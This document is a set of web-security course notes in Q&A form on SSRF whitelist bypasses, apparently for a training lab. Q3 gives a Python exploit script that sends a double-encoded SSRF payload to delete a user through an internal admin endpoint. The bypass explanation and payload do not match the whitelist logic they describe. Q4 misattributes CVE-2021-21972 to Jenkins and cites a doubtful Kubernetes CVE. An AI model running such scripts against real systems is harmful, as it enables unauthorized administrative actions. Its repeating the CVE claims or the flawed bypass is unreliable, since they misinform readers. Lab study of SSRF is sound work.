---
course: Web Security
topic: Server-Side Request Forgery (SSRF)
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain how a whitelist-based input filter works in the context of preventing SSRF attacks.**

A whitelist-based input filter works by allowing only specific, predefined values or patterns to pass through. In the context of preventing SSRF attacks, the application checks the input URL against a list of allowed domains or IP addresses. If the input matches one of these allowed entries, the request is processed; otherwise, it is rejected. For example, in the lab, the application only allows URLs that contain `stock.we-like-to-shop.net`. Any other domain or IP address is blocked, thus preventing SSRF attacks from accessing unauthorized resources.

**Q2. How would you exploit a whitelist-based SSRF defense by manipulating the URL format?**

To exploit a whitelist-based SSRF defense, one can manipulate the URL format to bypass the validation logic. In the lab, the application parses the URL and validates the hostname against a whitelist. By appending additional components such as `username@` before the allowed hostname, the application may misinterpret the URL structure and allow the request. Additionally, URL encoding the hostname multiple times can further obfuscate the input and bypass simple validation checks. For example, changing `localhost` to `username@localhost` and URL encoding it twice can trick the parser into accepting the request.

**Q3. Write a Python script to automate the deletion of the user 'Carlos' using the SSRF vulnerability described in the lab.**

```python
import requests
import sys
from urllib.parse import quote_plus

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

def delete_user(url):
    # SSRF payload to delete the user
    delete_user_payload = "username@%2523localhost/admin/delete_user?username=Carlos"
    # Double URL encode the payload
    encoded_payload = quote_plus(quote_plus(delete_user_payload))
    
    # Path to the vulnerable page
    check_stock_path = "/check_stock"

    # Parameters for the POST request
    params = {
        "stock_api": encoded_payload
    }

    # Perform the POST request
    response = requests.post(url + check_stock_path, data=params, verify=False)

    # Check if the user was deleted
    if "User deleted successfully" in response.text:
        print("Successfully deleted Carlos user.")
    else:
        print("Exploit was unsuccessful.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python ssrf_exploit.py <URL>")
        print("Example: python ssrf_exploit.py http://example.com")
        sys.exit(1)
    
    url = sys.argv[1]
    delete_user(url)
```

**Q4. Discuss recent real-world examples of SSRF vulnerabilities and how they were exploited.**

One notable real-world example of an SSRF vulnerability is the CVE-2021-21972, which affected the Jenkins CI/CD platform. An attacker could exploit this vulnerability to read arbitrary files on the server, including sensitive configuration files, by crafting malicious URLs. Another example is the CVE-2021-26605 affecting the Kubernetes API server, where an attacker could use SSRF to access internal services and steal secrets stored in the Kubernetes secret objects. Both cases highlight the importance of robust input validation and the potential risks associated with SSRF vulnerabilities.

**Q5. How would you configure a web application firewall (WAF) to mitigate SSRF attacks?**

To mitigate SSRF attacks using a WAF, you can configure rules to block requests that attempt to access unauthorized resources. This includes setting up rules to deny requests to internal IP addresses (e.g., 127.0.0.1, 192.168.x.x), and blocking requests that contain suspicious URL patterns or encoding. Additionally, you can enable strict validation of URL inputs, ensuring that only whitelisted domains are allowed. Regularly updating the WAF rules and monitoring logs for suspicious activity can help detect and prevent SSRF attacks.

---
<!-- nav -->
[[04-Understanding Whitelist-Based Input Filtering|Understanding Whitelist-Based Input Filtering]] | [[Web Security (PortSwigger)/09-Server-Side Request Forgery (SSRF)/05-Lab 4 SSRF with whitelist based input filter/00-Overview|Overview]]
